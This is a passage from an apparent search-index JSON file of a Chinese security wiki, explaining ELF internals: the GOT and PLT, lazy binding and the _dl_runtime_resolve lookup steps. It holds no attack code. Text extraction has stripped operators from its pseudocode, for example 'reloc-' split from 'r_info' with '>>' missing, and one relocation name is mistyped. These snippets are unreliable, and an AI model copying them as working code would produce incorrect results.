\u5bf9\u8c61\u7684\u4fe1\u606f\u3002\n\n\nGOT[2]\uff0c\u6307\u5411\u52a8\u6001\u88c5\u8f7d\u5668\u4e2d _dl_runtime_resolve \u51fd\u6570\u7684\u6307\u9488\u3002\n\n\n\n\n.got.plt \u540e\u9762\u7684\u9879\u5219\u662f\u7a0b\u5e8f\u4e2d\u4e0d\u540c .so \u4e2d\u51fd\u6570\u7684\u5f15\u7528\u5730\u5740\u3002\u4e0b\u9762\u7ed9\u51fa\u4e00\u4e2a\u76f8\u5e94\u7684\u5173\u7cfb\u3002\n\n\n\n\nProcedure Linkage Table\n\n\nGOT \u8868\u7528\u6765\u5c06\u4f4d\u7f6e\u72ec\u7acb\u7684\u5730\u5740\u91cd\u5b9a\u5411\u4e3a\u7edd\u5bf9\u5730\u5740\uff0c\u4e0e\u6b64\u7c7b\u4f3c\uff0cPLT\u8868\u5c06\u4f4d\u7f6e\u72ec\u7acb\u7684\u51fd\u6570\u91cd\u5b9a\u5411\u5230\u7edd\u5bf9\u5730\u5740\u3002\u4e3b\u8981\u5305\u62ec\u4e24\u90e8\u5206\n\n\n\n\n.plt\n\uff0c\u4e0e\u5e38\u89c1\u5bfc\u5165\u7684\u51fd\u6570\u6709\u5173\uff0c\u5982 read \u7b49\u51fd\u6570\u3002\n\n\n.plt.got\n\uff0c\u4e0e\u52a8\u6001\u94fe\u63a5\u6709\u5173\u7cfb\u3002\n\n\n\n\n\u5728\u52a8\u6001\u94fe\u63a5\u4e0b\uff0c\u7a0b\u5e8f\u6a21\u5757\u4e4b\u95f4\u5305\u542b\u4e86\u5927\u91cf\u7684\u51fd\u6570\u5f15\u7528\uff0c\u7a0b\u5e8f\u5f00\u59cb\u6267\u884c\u524d\uff0c\u52a8\u6001\u94fe\u63a5\u4f1a\u8017\u8d39\u4e0d\u5c11\u65f6\u95f4\u7528\u4e8e\u89e3\u51b3\u6a21\u5757\u4e4b\u95f4\u7684\u51fd\u6570\u5f15\u7528\u7684\u7b26\u53f7\u67e5\u627e\u4ee5\u53ca\u91cd\u5b9a\u4f4d\u3002\u4f46\u662f\uff0c\u5728\u4e00\u4e2a\u7a0b\u5e8f\u8fd0\u884c\u8fc7\u7a0b\u4e2d\uff0c\u53ef\u80fd\u5f88\u591a\u51fd\u6570\u5728\u7a0b\u5e8f\u6267\u884c\u5b8c\u65f6\u90fd\u4e0d\u4f1a\u7528\u5230\uff0c\u56e0\u6b64\u4e00\u5f00\u59cb\u5c31\u628a\u6240\u6709\u51fd\u6570\u90fd\u94fe\u63a5\u597d\u662f\u4e00\u79cd\u6d6a\u8d39\uff0c\u6240\u4ee5 ELF \u91c7\u7528\u4e86\u4e00\u79cd\u5ef6\u8fdf\u7ed1\u5b9a\u7684\u505a\u6cd5\uff0c\u5176\u57fa\u672c\u601d\u60f3\u662f\u51fd\u6570\u7b2c\u4e00\u6b21\u88ab\u7528\u5230\u65f6\u624d\u8fdb\u884c\u7ed1\u5b9a\uff08\u7b26\u53f7\u67e5\u627e\uff0c\u91cd\u5b9a\u4f4d\u7b49\uff09\uff0c\u5982\u679c\u6ca1\u6709\u7528\u5219\u4e0d\u8fdb\u884c\u7ed1\u5b9a\u3002\u6240\u4ee5\u7a0b\u5e8f\u5f00\u59cb\u6267\u884c\u524d\uff0c\u6a21\u5757\u95f4\u7684\u51fd\u6570\u8c03\u7528\u90fd\u6ca1\u6709\u8fdb\u884c\u7ed1\u5b9a\uff0c\u800c\u662f\u9700\u8981\u7528\u5230\u65f6\u624d\u7531\u52a8\u6001\u94fe\u63a5\u5668\u8d1f\u8d23\u7ed1\u5b9a\u3002\n\n\n\u94fe\u63a5\u7f16\u8f91\u5668\u4e0d\u80fd\u591f\u89e3\u6790\u6267\u884c\u6d41\u8f6c\u6362\uff08\u6bd4\u5982\u7a0b\u5e8f\u8c03\u7528\uff09\uff0c\u5373\u4ece\u4e00\u4e2a\u53ef\u6267\u884c\u6587\u4ef6\u6216\u8005\u5171\u4eab\u76ee\u6807\u6587\u4ef6\u5230\u53e6\u4e00\u4e2a\u6587\u4ef6\u3002\u94fe\u63a5\u5668\u5b89\u6392\u7a0b\u5e8f\u5c06\u63a7\u5236\u6743\u4ea4\u7ed9\u8fc7\u7a0b\u94fe\u63a5\u8868\u4e2d\u7684\u8868\u9879\u3002\u5728 Intel \u67b6\u6784\u4e2d\uff0c\u8fc7\u7a0b\u94fe\u63a5\u8868\u5b58\u5728\u4e8e\u5171\u4eab\u4ee3\u7801\u6bb5\u4e2d\uff0c\u4f46\u662f\u4ed6\u4eec\u4f1a\u4f7f\u7528\u5728 GOT \u8868\u4e2d\u7684\u6570\u636e\u3002\u52a8\u6001\u94fe\u63a5\u5668\u4f1a\u51b3\u5b9a\u76ee\u6807\u7684\u7edd\u5bf9\u5730\u5740\uff0c\u5e76\u4e14\u4f1a\u4fee\u6539\u76f8\u5e94\u7684 GOT \u8868\u4e2d\u7684\u5185\u5b58\u955c\u50cf\u3002\u56e0\u6b64\uff0c\u52a8\u6001\u94fe\u63a5\u5668\u53ef\u4ee5\u5728\u4e0d\u8fdd\u80cc\u4f4d\u7f6e\u72ec\u7acb\u4ee5\u53ca\u7a0b\u5e8f\u4ee3\u7801\u6bb5\u517c\u5bb9\u7684\u60c5\u51b5\u4e0b\uff0c\u91cd\u5b9a\u5411 PLT \u9879\u3002\u53ef\u6267\u884c\u6587\u4ef6\u548c\u5171\u4eab\u76ee\u6807\u6587\u4ef6\u90fd\u6709\u72ec\u7acb\u7684 PLT \u8868\u3002\n\n\n\u7edd\u5bf9\u5730\u5740\u7684\u8fc7\u7a0b\u94fe\u63a5\u8868\u5982\u4e0b\n\n\n.PLT0:pushl got_plus_4\n      jmp   *got_plus_8\n      nop; nop\n      nop; nop\n.PLT1:jmp   *name1_in_GOT\n      pushl $offset@PC\n      jmp   .PLT0@PC\n.PLT2:jmp   *name2_in_GOT\n      push  $offset\n      jmp   .PLT0@PC\n      ...\n\n\n\n\n\u4f4d\u7f6e\u65e0\u5173\u7684\u8fc7\u7a0b\u94fe\u63a5\u8868\u7684\u5730\u5740\u5982\u4e0b\n\n\n.PLT0:pushl 4(%ebx)\n      jmp   *8(%ebx)\n      nop; nop\n      nop; nop\n.PLT1:jmp   *name1_in_GOT(%ebx)\n      pushl $offset\n      jmp   .PLT0@PC\n.PLT2:jmp   *name2_in_GOT(%ebx)\n      push  $offset\n      jmp   .PLT0@PC\n      ...\n\n\n\n\n\u53ef\u4ee5\u770b\u51fa\u8fc7\u7a0b\u94fe\u63a5\u8868\u9488\u5bf9\u4e8e\u7edd\u5bf9\u5730\u5740\u4ee5\u53ca\u4f4d\u7f6e\u72ec\u7acb\u7684\u4ee3\u7801\u7684\u5904\u7406\u4e0d\u540c\u3002\u4f46\u662f\u52a8\u6001\u94fe\u63a5\u5668\u5904\u7406\u5b83\u4eec\u65f6\uff0c\u6240\u4f7f\u7528\u7684\u63a5\u53e3\u662f\u4e00\u6837\u7684\u3002\n\n\n\u52a8\u6001\u94fe\u63a5\u5668\u548c\u7a0b\u5e8f\u6309\u7167\u5982\u4e0b\u65b9\u5f0f\u89e3\u6790\u8fc7\u7a0b\u94fe\u63a5\u8868\u548c\u5168\u5c40\u504f\u79fb\u8868\u7684\u7b26\u53f7\u5f15\u7528\u3002\n\n\n\n\n\u5f53\u7b2c\u4e00\u6b21\u5efa\u7acb\u7a0b\u5e8f\u7684\u5185\u5b58\u955c\u50cf\u65f6\uff0c\u52a8\u6001\u94fe\u63a5\u5668\u5c06\u5168\u5c40\u504f\u79fb\u8868\u7684\u7b2c\u4e8c\u4e2a\u548c\u7b2c\u4e09\u4e2a\u9879\u8bbe\u7f6e\u4e3a\u7279\u6b8a\u7684\u503c\uff0c\u4e0b\u9762\u7684\u6b65\u9aa4\u4f1a\u4ed4\u7ec6\u89e3\u91ca\u8fd9\u4e9b\u6570\u503c\u3002\n\n\n\u5982\u679c\u8fc7\u7a0b\u94fe\u63a5\u8868\u662f\u4f4d\u7f6e\u72ec\u7acb\u7684\u8bdd\uff0c\u90a3\u4e48 GOT \u8868\u7684\u5730\u5740\u5fc5\u987b\u5728 ebx \u5bc4\u5b58\u5668\u4e2d\u3002\u6bcf\u4e00\u4e2a\u8fdb\u7a0b\u955c\u50cf\u4e2d\u7684\u5171\u4eab\u76ee\u6807\u6587\u4ef6\u90fd\u6709\u72ec\u7acb\u7684 PLT \u8868\uff0c\u5e76\u4e14\u7a0b\u5e8f\u53ea\u5728\u540c\u4e00\u4e2a\u76ee\u6807\u6587\u4ef6\u5c06\u63a7\u5236\u6d41\u4ea4\u7ed9 PLT \u8868\u9879\u3002\u56e0\u6b64\uff0c\u8c03\u7528\u51fd\u6570\u8d1f\u8d23\u5728\u8c03\u7528 PLT\u8868\u9879\u4e4b\u524d\uff0c\u5c06\u5168\u5c40\u504f\u79fb\u8868\u7684\u57fa\u5730\u5740\u8bbe\u7f6e\u4e3a\u5bc4\u5b58\u5668\u4e2d\u3002\n\n\n\u8fd9\u91cc\u4e3e\u4e2a\u4f8b\u5b50\uff0c\u5047\u8bbe\u7a0b\u5e8f\u8c03\u7528\u4e86name1\uff0c\u5b83\u5c06\u63a7\u5236\u6743\u4ea4\u7ed9\u4e86 lable .PLT1\u3002\n\n\n\u90a3\u4e48\uff0c\u7b2c\u4e00\u6761\u6307\u4ee4\u5c06\u4f1a\u8df3\u8f6c\u5230\u5168\u5c40\u504f\u79fb\u8868\u4e2d name1\u7684\u5730\u5740\u3002\u521d\u59cb\u65f6\uff0c\u5168\u5c40\u504f\u79fb\u8868\u4e2d\u5305\u542b PLT \u4e2d\u4e0b\u4e00\u6761 pushl\u6307\u4ee4\u7684\u5730\u5740\uff0c\u5e76\u4e0d\u662f name1\u7684\u5b9e\u9645\u5730\u5740\u3002\n\n\n\u56e0\u6b64\uff0c\u7a0b\u5e8f\u5c06\u4e00\u4e2a\u91cd\u5b9a\u5411\u504f\u79fb\uff08reloc_index\uff09\u538b\u5230\u6808\u4e0a\u3002\u91cd\u5b9a\u4f4d\u504f\u79fb\u662f 32 \u4f4d\u7684\uff0c\u5e76\u4e14\u662f\u975e\u8d1f\u7684\u6570\u503c\u3002\u6b64\u5916\uff0c\u91cd\u5b9a\u4f4d\u8868\u9879\u7684\u7c7b\u578b\u4e3a R_386_JMP_SLOT\uff0c\u5e76\u4e14\u5b83\u5c06\u4f1a\u8bf4\u660e\u5728\u4e4b\u524d jmp \u6307\u4ee4\u4e2d\u4f7f\u7528\u7684\u5168\u5c40\u504f\u79fb\u8868\u9879\u5728 GOT \u8868\u4e2d\u7684\u504f\u79fb\u3002\u91cd\u5b9a\u4f4d\u8868\u9879\u4e5f\u5305\u542b\u4e86\u4e00\u4e2a\u7b26\u53f7\u8868\u7d22\u5f15\uff0c\u56e0\u6b64\u544a\u8bc9\u52a8\u6001\u94fe\u63a5\u5668\u4ec0\u4e48\u7b26\u53f7\u76ee\u524d\u6b63\u5728\u88ab\u5f15\u7528\u3002\u5728\u8fd9\u4e2a\u4f8b\u5b50\u4e2d\uff0c\u5c31\u662f name1\u4e86\u3002\n\n\n\u5728\u538b\u5165\u91cd\u5b9a\u4f4d\u504f\u79fb\u540e\uff0c\u7a0b\u5e8f\u4f1a\u8df3\u8f6c\u5230 .PLT0\uff0c\u8fd9\u662f\u8fc7\u7a0b\u94fe\u63a5\u8868\u7684\u7b2c\u4e00\u4e2a\u8868\u9879\u3002pushl \u6307\u4ee4\u5c06 GOT \u8868\u7684\u7b2c\u4e8c\u4e2a\u8868\u9879(got_plus_4 \u6216\u80054(%ebx)\uff0c\n\u5f53\u524dELF\u5bf9\u8c61\u7684\u4fe1\u606f\n)\u538b\u5230\u6808\u4e0a\uff0c\u7136\u540e\u7ed9\u52a8\u6001\u94fe\u63a5\u5668\u4e00\u4e2a\u8bc6\u522b\u4fe1\u606f\u3002\u6b64\u540e\uff0c\u7a0b\u5e8f\u4f1a\u8df3\u8f6c\u5230\u7b2c\u4e09\u4e2a\u5168\u5c40\u504f\u79fb\u8868\u9879(got_plus_8 \u6216\u80058(%ebx)\uff0c\n\u6307\u5411\u52a8\u6001\u88c5\u8f7d\u5668\u4e2d_dl_runtime_resolve\u51fd\u6570\u7684\u6307\u9488\n) \u5904\uff0c\u8fd9\u5c06\u4f1a\u5c06\u7a0b\u5e8f\u6d41\u4ea4\u7ed9\u52a8\u6001\u94fe\u63a5\u5668\u3002\n\n\n\u5f53\u52a8\u6001\u94fe\u63a5\u5668\u63a5\u6536\u5230\u63a7\u5236\u6743\u540e\uff0c\u4ed6\u5c06\u4f1a\u8fdb\u884c\u51fa\u6808\u64cd\u4f5c\uff0c\u67e5\u770b\u91cd\u5b9a\u4f4d\u8868\u9879\uff0c\u627e\u5230\u5bf9\u5e94\u7684\u7b26\u53f7\u7684\u503c\uff0c\u5c06 name1 \u7684\u5730\u5740\u5b58\u50a8\u5728\u5168\u5c40\u504f\u79fb\u8868\u9879\u4e2d\uff0c\u7136\u540e\u5c06\u63a7\u5236\u6743\u4ea4\u7ed9\u76ee\u7684\u5730\u5740\u3002\n\n\n\u8fc7\u7a0b\u94fe\u63a5\u8868\u6267\u884c\u4e4b\u540e\uff0c\u7a0b\u5e8f\u7684\u63a7\u5236\u6743\u5c06\u4f1a\u76f4\u63a5\u4ea4\u7ed9 name1 \u51fd\u6570\uff0c\u800c\u4e14\u6b64\u540e\u518d\u4e5f\u4e0d\u4f1a\u8c03\u7528\u52a8\u6001\u94fe\u63a5\u5668\u6765\u89e3\u6790\u8fd9\u4e2a\u51fd\u6570\u3002\u4e5f\u5c31\u662f\u8bf4\uff0c\u5728 .PLT1 \u5904\u7684 jmp \u6307\u4ee4\u5c06\u4f1a\u76f4\u63a5\u8df3\u8f6c\u5230 name1 \u5904\uff0c\u800c\u4e0d\u662f\u518d\u6b21\u6267\u884c pushl \u6307\u4ee4\u3002\n\n\n\n\n\u603b\u4f53\u6d41\u7a0b\u5982\u4e0b\u56fe\u6240\u793a\uff0c\u84dd\u7ebf\u8868\u793a\u9996\u6b21\u6267\u884c\u7684\u6d41\u7a0b\u56fe\uff0c\u7ea2\u7ebf\u8868\u793a\u7b2c\u4e8c\u6b21\u4ee5\u540e\u8c03\u7528\u7684\u6d41\u7a0b\u56fe\uff1a\n\n\n\n\nLD_BIND_NOW \u73af\u5883\u53d8\u91cf\u53ef\u4ee5\u6539\u53d8\u52a8\u6001\u94fe\u63a5\u5668\u7684\u884c\u4e3a\u3002\u5982\u679c\u5b83\u7684\u503c\u975e\u7a7a\u7684\u8bdd\uff0c\u52a8\u6001\u94fe\u63a5\u5668\u5728\u5c06\u63a7\u5236\u6743\u4ea4\u7ed9\u7a0b\u5e8f\u4e4b\u524d\u4f1a\u6267\u884c PLT \u8868\u9879\u3002\u4e5f\u5c31\u662f\u8bf4\uff0c\u52a8\u6001\u94fe\u63a5\u5668\u5728\u8fdb\u7a0b\u521d\u59cb\u5316\u8fc7\u7a0b\u4e2d\u6267\u884c\u7c7b\u578b\u4e3a R_3862_JMP_SLOT \u7684\u91cd\u5b9a\u4f4d\u8868\u9879\u3002\u5426\u5219\u7684\u8bdd\uff0c\u52a8\u6001\u94fe\u63a5\u8868\u4f1a\u5bf9\u8fc7\u7a0b\u94fe\u63a5\u8868\u9879\u8fdb\u884c\u5ef6\u8fdf\u7ed1\u5b9a\uff0c\u76f4\u5230\u7b2c\u4e00\u6b21\u6267\u884c\u5bf9\u5e94\u7684\u8868\u9879\u65f6\uff0c\u624d\u4f1a\u4eca\u6b21\u90a3\u4e2a\u7b26\u53f7\u89e3\u6790\u4ee5\u53ca\u91cd\u5b9a\u4f4d\u3002\n\n\n\u6ce8\u610f\n\n\n\n\n\u60f0\u6027\u7ed1\u5b9a\u901a\u5e38\u6765\u8bf4\u4f1a\u63d0\u9ad8\u5e94\u7528\u7a0b\u5e8f\u7684\u6027\u80fd\uff0c\u56e0\u4e3a\u6ca1\u6709\u4f7f\u7528\u7684\u7b26\u53f7\u5e76\u4e0d\u4f1a\u589e\u52a0\u52a8\u6001\u94fe\u63a5\u7684\u8d1f\u8f7d\u3002\u7136\u800c\uff0c\u6709\u4ee5\u4e0b\u4e24\u79cd\u60c5\u51b5\u5c06\u4f1a\u4f7f\u5f97\u60f0\u6027\u7ed1\u5b9a\u51fa\u73b0\u672a\u9884\u671f\u7684\u60c5\u51b5\u3002\u9996\u5148\uff0c\u5bf9\u4e8e\u4e00\u4e2a\u5171\u4eab\u76ee\u6807\u6587\u4ef6\u7684\u51fd\u6570\u7684\u521d\u59cb\u5f15\u7528\u4e00\u822c\u6765\u8bf4\u4f1a\u8d85\u8fc7\u540e\u7eed\u8c03\u7528\u7684\u65f6\u95f4\uff0c\u56e0\u4e3a\u52a8\u6001\u94fe\u63a5\u5668\u9700\u8981\u62e6\u622a\u8c03\u7528\u4ee5\u4fbf\u4e8e\u53bb\u89e3\u6790\u7b26\u53f7\u3002\u4e00\u4e9b\u5e94\u7528\u5e76\u4e0d\u80fd\u591f\u5fcd\u53d7\u8fd9\u79cd\u4e0d\u53ef\u9884\u6d4b\u6027\u3002\u5176\u6b21\uff0c\u5982\u679c\u53d1\u751f\u4e86\u9519\u8bef\uff0c\u5e76\u4e14\u52a8\u6001\u94fe\u63a5\u5668\u4e0d\u80fd\u591f\u89e3\u6790\u7b26\u53f7\u3002\u52a8\u6001\u94fe\u63a5\u5668\u5c06\u4f1a\u7ec8\u6b62\u7a0b\u5e8f\u3002\u5728\u60f0\u6027\u7ed1\u5b9a\u7684\u60c5\u51b5\u4e0b\uff0c\u8fd9\u79cd\u60c5\u51b5\u53ef\u80fd\u968f\u65f6\u53d1\u751f\u3002\u5f53\u5173\u95ed\u4e86\u60f0\u6027\u7ed1\u5b9a\u7684\u8bdd\uff0c\u52a8\u6001\u94fe\u63a5\u5668\u5728\u8fdb\u7a0b\u521d\u59cb\u5316\u7684\u8fc7\u7a0b\u4e2d\u5c31\u4e0d\u4f1a\u51fa\u73b0\u76f8\u5e94\u7684\u9519\u8bef\uff0c\u56e0\u4e3a\u8fd9\u4e9b\u90fd\u662f\u5728\u5e94\u7528\u83b7\u5f97\u63a7\u5236\u6743\u4e4b\u524d\u6267\u884c\u7684\u3002\n\n\n\n\n\u5728 Linux \u7684\u8bbe\u8ba1\u4e2d\uff0c\u7b2c\u4e00\u4e2a\u4e4b\u540e\u7684 PLT \u6761\u76ee\u8fdb\u884c\u4e86\u5982\u4e0b\u7684\u51fd\u6570\u8c03\u7528\n\n\n_dl_runtime_resolve\n(\nlink_map_obj\n,\n \nreloc_index\n)\n\n\n\n\n\n\u8fd9\u91cc\u4ee5 32 \u4f4d\u4e3a\u4f8b\uff0864\u4f4d\u7c7b\u4f3c\uff09\uff0c\u5177\u4f53\u7684\u8fc7\u7a0b\u5982\u4e0b\n\n\n\n\n\u6839\u636e reloc_index \u8ba1\u7b97\u76f8\u5e94\u7684\u91cd\u5b9a\u4f4d\u8868\u9879\uff1a\nElf32_Rel *reloc = JMPREL + index\n \n\n\n\u6839\u636e\u5f97\u5230\u7684\u91cd\u5b9a\u4f4d\u8868\u9879\u7684r_info\u5f97\u5230\u5bf9\u5e94\u7684\u7b26\u53f7\u5728\u7b26\u53f7\u8868\u4e2d\u7684\u7d22\u5f15\uff1a\n(reloc-\nr_info)\n8\n\n\n\u7ee7\u800c\u5f97\u5230\u5bf9\u5e94\u7684\u7b26\u53f7\uff1a\nElf32_Sym *sym = \nSYMTAB[((reloc-\nr_info)\n8)]\n\n\n\u5224\u65ad\u7b26\u53f7\u7684\u7c7b\u578b\u662f\u5426\u4e3a R_386_JMP_SLOT\uff1a\nassert (((reloc-\nr_info)\n0xff) == 0x7 )\n\n\nif ((ELFW(ST_VISIBILITY) (sym-\nst_other), 0) == 0)\n\n\nif (sym-\nst_other) \n 3 == 0 )\n\n\n\u5224\u65ad\u8be5\u7b26\u53f7\u662f\u5426\u5df2\u7ecf\u89e3\u6790\u8fc7\u4e86\uff0c\u5982\u679c\u89e3\u6790\u8fc7\uff0c\u5c31\u4e0d\u4f1a\u518d\u53bb\u6267\u884c lookup \u64cd\u4f5c\u3002\n\n\n\n\n\n\n\u5f97\u5230\u7b26\u53f7\u7684\u7248\u672c\uff0c\u5982\u679c ndx \u4e3a 0 \u7684\u8bdd\uff0c\u4f1a\u76f4\u63a5\u4f7f\u7528 local symbol\u3002\n\n\nuint16_t ndx = VERSYM[ (reloc-\nr_info) \n 8]\n\n\nr_found_version *version = \nl-\nl_version[ndx]\n\n\n\n\n\n\n\u6839\u636e name \u6765\u5bfb\u627e\u76f8\u5e94\u51fd\u6570\u5728\u5e93\u4e2d\u7684\u5730\u5740\u3002\n\n\nname = STRTAB + sym-\nst_name\n\n\n\n\n\n\n\n\n.eh_frame related\n\n\n.eh_frame_hdr\n\n\n.eh_frame\n\n\n\u4f8b\u5b50\n\n\n\u8fd9\u91cc\u7ed9\u51fa\u4e00\u4e2aelf\u6587\u4ef6\u6bd4\u8f83\u7ecf\u5178\u7684\u4f8b\u5b50\u3002\n\n\n\n\n\u6709\u65f6\u95f4\u4f1a\u7ed3\u5408\u5177\u4f53\u7684\u7a0b\u5e8f\uff0c\u7ed9\u51fa\u4e00\u4e2a\u66f4\u597d\u7684\u4f8b\u5b50\u3002\n\n\n\u53c2\u8003\u6587\u732e\n\n\n\n\nhttps://blogs.oracle.com/ali/gnu-hash-elf-sections\n\n\nhttps://bbs.pediy.com/thread-204642.htm", 
            "title": "ELF\u6587\u4ef6\u57fa\u672c\u7ed3\u6784"
        }, 
        {
            "location": "/executable/elf/elf_structure/#elf", 
            "text": "\u672c\u90e8\u5206\u5185\u5bb9\u6765\u6e90\u4e8e ELF 1.2 \u6807\u51c6\uff0c\u5185\u5bb9\u7ecf\u8fc7\u4e00\u5b9a\u7684\u4fee\u6539\u4e0e\u6574\u7406\uff0c\u4e3b\u8981\u53c2\u8003\u6587\u732e\u5982\u4e0b   ELF \u6587\u4ef6\u683c\u5f0f\u5206\u6790\uff0c\u5317\u4eac\u5927\u5b66\uff0c\u6ed5\u542f\u660e  ELF-\u6467\u6bc1\u5723\u8bde", 
            "title": "ELF \u6587\u4ef6"
        }, 
        {
            "location": "/executable/elf/elf_structure/#_1", 
            "text": "ELF \uff08Executable and Linkable Format\uff09\u6587\u4ef6\uff0c\u4e5f\u5c31\u662f\u5728 Linux \u4e2d\u7684\u76ee\u6807\u6587\u4ef6\uff0c\u4e3b\u8981\u6709\u4ee5\u4e0b\u4e09\u79cd\u7c7b\u578b   \u53ef\u91cd\u5b9a\u4f4d\u6587\u4ef6\uff08Relocatable File\uff09\uff0c\u5305\u542b\u7531\u7f16\u8bd1\u5668\u751f\u6210\u7684\u4ee3\u7801\u4ee5\u53ca\u6570\u636e\u3002\u94fe\u63a5\u5668\u4f1a\u5c06\u5b83\u4e0e\u5176\u5b83\u76ee\u6807\u6587\u4ef6\u94fe\u63a5\u8d77\u6765\u4ece\u800c\u521b\u5efa\u53ef\u6267\u884c\u6587\u4ef6\u6216\u8005\u5171\u4eab\u76ee\u6807\u6587\u4ef6\u3002\u5728 Linux \u7cfb\u7edf\u4e2d\uff0c\u8fd9\u79cd\u6587\u4ef6\u7684\u540e\u7f00\u4e00\u822c\u4e3a  .o  \u3002   \u53ef\u6267\u884c\u6587\u4ef6\uff08Executable File\uff09\uff0c\u5c31\u662f\u6211\u4eec\u901a\u5e38\u5728 Linux \u4e2d\u6267\u884c\u7684\u7a0b\u5e8f\u3002    \u5171\u4eab\u76ee\u6807\u6587\u4ef6\uff08Shared Object File\uff09\uff0c\u5305\u542b\u4ee3\u7801\u548c\u6570\u636e\uff0c\u8fd9\u79cd\u6587\u4ef6\u662f\u6211\u4eec\u6240\u79f0\u7684\u5e93\u6587\u4ef6\uff0c\u4e00\u822c\u4ee5  .so  \u7ed3\u5c3e\u3002\u4e00\u822c\u60c5\u51b5\u4e0b\uff0c\u5b83\u6709\u4ee5\u4e0b\u4e24\u79cd\u4f7f\u7528\u60c5\u666f   \u94fe\u63a5\u5668\uff08Link eDitor, ld\uff09\u53ef\u80fd\u4f1a\u5904\u7406\u5b83\u548c\u5176\u5b83\u53ef\u91cd\u5b9a\u4f4d\u6587\u4ef6\u4ee5\u53ca\u5171\u4eab\u76ee\u6807\u6587\u4ef6\uff0c\u751f\u6210\u53e6\u5916\u4e00\u4e2a\u76ee\u6807\u6587\u4ef6\u3002  \u52a8\u6001\u94fe\u63a5\u5668\uff08Dynamic Linker\uff09\u5c06\u5b83\u4e0e\u53ef\u6267\u884c\u6587\u4ef6\u4ee5\u53ca\u5176\u5b83\u5171\u4eab\u76ee\u6807\u7ec4\u5408\u5728\u4e00\u8d77\u751f\u6210\u8fdb\u7a0b\u955c\u50cf\u3002    \u5173\u4e8eLink eDitor\u7684\u547d\u540d\uff0c https://en.wikipedia.org/wiki/GNU_linker   \u76ee\u6807\u6587\u4ef6\u7531\u6c47\u7f16\u5668\u548c\u94fe\u63a5\u5668\u521b\u5efa\uff0c\u662f\u6587\u672c\u7a0b\u5e8f\u7684\u4e8c\u8fdb\u5236\u5f62\u5f0f\uff0c\u53ef\u4ee5\u76f4\u63a5\u5728\u5904\u7406\u5668\u4e0a\u8fd0\u884c\u3002\u90a3\u4e9b\u9700\u8981\u865a\u62df\u673a\u624d\u80fd\u591f\u6267\u884c\u7684\u7a0b\u5e8f(Java)\u4e0d\u5c5e\u4e8e\u8fd9\u4e00\u8303\u56f4\u3002  \u8fd9\u91cc\u6211\u4eec\u4e3b\u8981\u5173\u6ce8\u4e8e ELF \u7684\u6587\u4ef6\u683c\u5f0f\u3002", 
            "title": "\u7b80\u4ecb"
        }, 
        {
            "location": "/executable/elf/elf_structure/#_2", 
            "text": "\u76ee\u6807\u6587\u4ef6\u65e2\u4f1a\u53c2\u4e0e\u7a0b\u5e8f\u94fe\u63a5\u53c8\u4f1a\u53c2\u4e0e\u7a0b\u5e8f\u6267\u884c\u3002\u51fa\u4e8e\u65b9\u4fbf\u6027\u548c\u6548\u7387\u8003\u8651\uff0c\u6839\u636e\u8fc7\u7a0b\u7684\u4e0d\u540c\uff0c\u76ee\u6807\u6587\u4ef6\u683c\u5f0f\u63d0\u4f9b\u4e86\u5176\u5185\u5bb9\u7684\u4e24\u79cd\u5e76\u884c\u89c6\u56fe\uff0c\u5982\u4e0b   \u9996\u5148\uff0c\u6211\u4eec\u6765 \u5173\u6ce8\u4e00\u4e0b\u94fe\u63a5\u89c6\u56fe \u3002  \u6587\u4ef6\u5f00\u59cb\u5904\u662f ELF \u5934\u90e8\uff08  ELF  Header \uff09\uff0c\u5b83\u7ed9\u51fa\u4e86\u6574\u4e2a\u6587\u4ef6\u7684\u7ec4\u7ec7\u60c5\u51b5\u3002  \u5982\u679c\u7a0b\u5e8f\u5934\u90e8\u8868\uff08Program Header Table\uff09\u5b58\u5728\u7684\u8bdd\uff0c\u5b83\u4f1a\u544a\u8bc9\u7cfb\u7edf\u5982\u4f55\u521b\u5efa\u8fdb\u7a0b\u3002\u7528\u4e8e\u751f\u6210\u8fdb\u7a0b\u7684\u76ee\u6807\u6587\u4ef6\u5fc5\u987b\u5177\u6709\u7a0b\u5e8f\u5934\u90e8\u8868\uff0c\u4f46\u662f\u91cd\u5b9a\u4f4d\u6587\u4ef6\u4e0d\u9700\u8981\u8fd9\u4e2a\u8868\u3002  \u8282\u533a\u90e8\u5206\u5305\u542b\u5728\u94fe\u63a5\u89c6\u56fe\u4e2d\u8981\u4f7f\u7528\u7684\u5927\u90e8\u5206\u4fe1\u606f\uff1a\u6307\u4ee4\u3001\u6570\u636e\u3001\u7b26\u53f7\u8868\u3001\u91cd\u5b9a\u4f4d\u4fe1\u606f\u7b49\u7b49\u3002  \u8282\u533a\u5934\u90e8\u8868\uff08Section Header Table\uff09\u5305\u542b\u4e86\u63cf\u8ff0\u6587\u4ef6\u8282\u533a\u7684\u4fe1\u606f\uff0c\u6bcf\u4e2a\u8282\u533a\u5728\u8868\u4e2d\u90fd\u6709\u4e00\u4e2a\u8868\u9879\uff0c\u4f1a\u7ed9\u51fa\u8282\u533a\u540d\u79f0\u3001\u8282\u533a\u5927\u5c0f\u7b49\u4fe1\u606f\u3002\u7528\u4e8e\u94fe\u63a5\u7684\u76ee\u6807\u6587\u4ef6\u5fc5\u987b\u6709\u8282\u533a\u5934\u90e8\u8868\uff0c\u5176\u5b83\u76ee\u6807\u6587\u4ef6\u5219\u65e0\u6240\u8c13\uff0c\u53ef\u4ee5\u6709\uff0c\u4e5f\u53ef\u4ee5\u6ca1\u6709\u3002  \u8fd9\u91cc\u7ed9\u51fa\u4e00\u4e2a\u5173\u4e8e\u94fe\u63a5\u89c6\u56fe\u6bd4\u8f83\u5f62\u8c61\u7684\u5c55\u793a   \u5bf9\u4e8e \u6267\u884c\u89c6\u56fe \u6765\u8bf4\uff0c\u5176\u4e3b\u8981\u7684\u4e0d\u540c\u70b9\u5728\u4e8e\u6ca1\u6709\u4e86section\uff0c\u800c\u6709\u4e86\u591a\u4e2asegment\u3002\u5176\u5b9e\u8fd9\u91cc\u7684 segment \u5927\u90fd\u662f\u6765\u6e90\u4e8e\u94fe\u63a5\u89c6\u56fe\u4e2d\u7684 section\u3002  \u6ce8\u610f:   \u5c3d\u7ba1\u56fe\u4e2d\u662f\u6309\u7167 ELF \u5934\uff0c\u7a0b\u5e8f\u5934\u90e8\u8868\uff0c\u8282\u533a\uff0c\u8282\u533a\u5934\u90e8\u8868\u7684\u987a\u5e8f\u6392\u5217\u7684\u3002\u4f46\u5b9e\u9645\u4e0a\u9664\u4e86 ELF  